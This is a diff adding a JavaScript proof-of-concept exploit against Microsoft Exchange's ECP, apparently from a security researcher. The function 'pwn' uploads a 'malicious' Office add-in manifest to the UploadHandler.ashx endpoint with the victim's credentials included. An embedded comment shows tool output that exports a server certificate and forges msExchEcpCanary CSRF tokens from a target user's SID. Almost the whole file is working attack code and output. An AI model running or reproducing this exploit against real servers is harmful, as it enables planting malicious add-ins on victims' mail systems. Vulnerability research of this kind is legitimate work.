@@ -1,0 +1,42 @@
+function pwn(data){
+  var fd = new FormData()
+  fd.append("handlerClass", "AddExtensionService");
+  fd.append("parameters", "{}");
+  fd.append('uploadFile', new Blob([data]), 'blob');
+  /*
+  
+  Change <generated> to a generated and valid csrf token:
+  
+  ```
+  researcher@srcincite:~$ ./poc.py WIN-0K4AOM2JIN6.exchangedemo.com harryh@exchangedemo.com:user123###
+  (+) found the thumbprint: F4EB6AADB8D7C0D12E756BA2E28F90CCACD41299
+  (+) exported the cert to the target filesystem
+  (+) saved the cert to testcert.der using password: hax
+  ```
+  
+  Now you can generate csrf tokens with YellowCanary using a target users SID:
+  
+  ```
+  c:\Users\researcher>poc.exe S-1-5-21-257332918-392067043-4020791575-3104 testcert.der hax
+
+              #====================================================
+              # YellowCanary - generate msExchEcpCanary csrf tokens
+              #====================================================
+
+  security identifier : S-1-5-21-257332918-392067043-4020791575-3104
+  msExchEcpCanary     : sA0o0nS_C0G_PMdcA_dAd5BdAEL_-NcYhndaAwlhBJFs4a4iKy4sn53azH-O5Ix3F0jnwzZZUsk.
+  ```
+
+  So now the request would be https://<target>/ecp/Handlers/UploadHandler.ashx?msExchEcpCanary=sA0o0nS_C0G_PMdcA_dAd5BdAEL_-NcYhndaAwlhBJFs4a4iKy4sn53azH-O5Ix3F0jnwzZZUsk.
+  
+  */
+  fetch('https://<target>/ecp/Handlers/UploadHandler.ashx?msExchEcpCanary=<generated>', {
+    method: 'POST',
+    body: fd,
+	credentials: 'include'
+  })
+}
+// store your malicious office-admin menifest file inside of malicifest.xml
+fetch('/malicifest.xml')
+  .then(response => response.text())
+  .then(text => pwn(text))
